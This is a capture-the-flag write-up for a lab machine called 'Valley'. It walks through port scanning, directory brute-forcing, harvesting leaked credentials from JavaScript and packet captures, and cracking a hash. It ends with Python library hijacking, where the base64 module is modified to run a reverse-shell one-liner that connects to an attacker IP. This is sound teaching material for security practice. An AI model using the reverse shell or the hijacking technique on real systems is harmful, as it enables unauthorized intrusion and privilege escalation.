Can you find your way into the Valley?

# ✅ **Reconnaissance**

# ✅  Open Ports Scanning With Rustscan

![](/assets/img/kryolite_security.001.jpeg)

We got the three ports open

80 - HTTP

22 - SSH

37370 - Unknown

now, lets run the NMAP scan over these to get more information 

## ✅  Service Version Enumeration with NMAP

![](/assets/img/kryolite_security.002.png)

As you can see we have the port 37370 for FTP

# ✅ Webserver Enumeration

On visiting the website we got very a very poorly developed website :

![](/assets/img/kryolite_security.003.jpeg)

on clicking on the buttons given on the sites it takes us to their destination pages . After doing some manual Enumeration , lets jump off to directory brute-forcing.

so , for that lets use Gobuster

# ✅  Gobuster for Directory Brute-forcing

The Command that we will be using for that is :

```shell
gobuster dir -u http://10.10.65.54/ -w /usr/share/seclists/Discovery/Web- Content/big.txt -x conf,config,txt,text,php -t 64
```

![](/assets/img/kryolite_security.005.jpeg)

From the result , we do see certain directories , but not much after checking manually , so , lets try to run the directory brute-force to do recursive scanning

Our Command Would Be : 

```shell
gobuster dir -u http://10.10.65.54/pricing -w /usr/share/seclists/Discovery/Web-Content/common.txt -x conf,config,txt,text,php - t 64
```

![](/assets/img/kryolite_security.007.jpeg)

as you can see we got something new note.txt

![](/assets/img/kryolite_security.009.png)

This message gives us indictor that their could be something more potential information left off on the server , so lets continue with our recursive directory brute-forcing

```shell
gobuster dir -u http://10.10.65.54/static -w /usr/share/seclists/Discovery/Web- Content/common.txt -x conf,config,txt,text,php -t 50
```

![](/assets/img/kryolite_security.011.jpeg)

We got several directory , which are basically pointing us to an image , but 00 stands out from other , because its not there on the gallery page !! , where static images are shown , so , lets check it out !

![](/assets/img/kryolite_security.013.jpeg)

ok , so we got some information from there !!

possible username : **valleyDev** 
possible endpoint : **/dev1243224123123**

lets try to visit the newly discovered endpoint !

![](/assets/img/kryolite_security.014.jpeg)

as you can see we got a new login page !!

after giving some basic default credential and trying for sql injection and other vulnerability , lets try to check up for source code review !

![](/assets/img/kryolite_security.015.jpeg)

as you can see its using certain JS file , lets review them also ! from the dev.js file we got something very confidential :

![](/assets/img/kryolite_security.017.png)

the site is using the client side authentication whose username and password is : **siemDev & california**

so , after logging in we got this :

![](/assets/img/kryolite_security.020.jpeg)

its says stop reusing credentials , means there are possibility that these credential are used somewhere , so , we have two possible options

- SSH
- FTP

lets try these credential first on FTP

# ✅ FTP Credential Based Logging 

and we got a successful login :

![](/assets/img/kryolite_security.021.png)

on logging in , lets discover what is there on this FTP server :

![](/assets/img/kryolite_security.022.jpeg)

we got three files , seems like a packet capture files !! lets download these file with mget

![](/assets/img/kryolite_security.024.jpeg)

now that we have the files , lets analyze them with Wireshark !

# ✅ File analysis with Wireshark

after doing analysis on the all the file , the file siemHTTP2.pcapng seems little interesting

![](/assets/img/kryolite_security.025.jpeg)

we have the one more credential :

username : **valleyDev** 
password : **ph0t0s1234**

now , that we have a new credential , lets try to use these credential over SSH

# ✅ **Initial Foothold**

# ✅ SSH to machine with Credential

![](/assets/img/kryolite_security.027.jpeg)

and yes , we are now able to access the machine !!

# ✅ **Privilege Escalation**

After doing some basic recon form privilege escalation , lets try to use linpeas . first download it on victim box and give necessary permission to it.

![](/assets/img/kryolite_security.029.jpeg)

now , lets execute it , after executing we find some things different than usual :

![](/assets/img/kryolite_security.030.jpeg)

![](/assets/img/kryolite_security.031.jpeg)

lets first try to see what is there in `/photos` since it is there in the main root directory

![](/assets/img/kryolite_security.033.jpeg)

lets view the script :

![](/assets/img/kryolite_security.034.jpeg)

so , basically the script is encrypting the .jpg file in current directory to `/PhotoVault` directory.

now one possible way for escalating our privileges would be to modify the file , but we don't have necessary privileges

but before that , lets check if the script is running in crontab

![](/assets/img/kryolite_security.036.jpeg)

and yes , its running in every one minute 

# ✅ Python Library HIJACKING

since we don't have permission to write to the encryption script , but the script is importing the base64 library of python using command import base64 , we can hijack that

- we can write a base64.py file there , but directory is not writeable by us.

- we can hijack the original file , if we have necessary privilege, lets check out

![](/assets/img/kryolite_security.038.png)

but , we are in valleyDev Groups !! 

DEAD\_END :(

# ✅ Other Privesc Vector

we got one unusual binary in /home directory valleyAuthenticator , after trying certain username and password we found and also some default credential , we get wrong username or password.

In this case , lets try to reverse engineer the binary on our attacking machine !! first we need to download it , we can download it using SCP

```shell
scp valleyDev@10.10.128.45:/home/valleyAuthenticator .
```

after we have download , first lets analyze it with string , we can get something here !!

![](/assets/img/kryolite_security.041.jpeg)

and as you can see , we got some wired looking maybe MD5 hash (length=32=MD5) lets try to crack it online , we can use cassation !!

![](/assets/img/kryolite_security.042.jpeg)

and as , you can see , we got the some credential !!

![](/assets/img/kryolite_security.043.png)

since we got the credential for valley , lets login to that shell !!

![](/assets/img/kryolite_security.044.png)

and now we are in valley user , which basically belongs to valleyAdmin group !

![](/assets/img/kryolite_security.045.png)

now, since we are part of valleyAdmin group we can change the base64.py file , for python library hijacking

![](/assets/img/kryolite_security.047.jpeg)

lets open the file /usr/lib/python3.8/base64.py and add this payload of reverse-shell to file

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.0.110",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

![](/assets/img/kryolite_security.051.jpeg)

and keep your nc listener ready : `nc -lvp 1337` 

now , wait for the cronjob to complete in one minute !

![](/assets/img/kryolite_security.054.jpeg)

and we got a connection !!
